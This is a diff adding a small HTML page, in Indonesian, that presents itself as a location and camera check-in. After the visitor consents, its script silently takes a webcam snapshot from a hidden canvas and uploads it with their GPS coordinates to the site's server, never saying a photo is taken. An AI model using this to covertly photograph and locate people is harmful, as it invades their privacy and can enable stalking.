@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location & Camera Tracker</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 2rem; }
+    video, canvas { width: 100%; max-width: 300px; margin-top: 1rem; border-radius: 12px; }
+    button { padding: 10px 20px; font-size: 16px; margin-top: 1rem; }
+  </style>
+</head>
+<body>
+  <h1>Check-in Lokasi & Kamera</h1>
+  <p>Mohon izinkan akses lokasi dan kamera Anda.</p>
+  <button onclick="startTracking()">Izinkan & Lanjutkan</button>
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    async function startTracking() {
+      let coords = {};
+
+      // Akses lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          coords = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+          };
+        }, (err) => {
+          alert("Gagal mendapatkan lokasi: " + err.message);
+        });
+      } else {
+        alert("Geolocation tidak didukung di perangkat ini.");
+        return;
+      }
+
+      // Akses kamera
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Tunggu video siap lalu ambil snapshot
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(async (blob) => {
+              const formData = new FormData();
+              formData.append('latitude', coords.latitude);
+              formData.append('longitude', coords.longitude);
+              formData.append('image', blob, 'snapshot.jpg');
+
+              await fetch('/api/location', {
+                method: 'POST',
+                body: formData,
+              });
+            }, 'image/jpeg');
+          }, 2000);
+        };
+
+      } catch (error) {
+        alert("Gagal mengakses kamera: " + error);
+      }
+    }
+  </script>
+</body>
+</html>
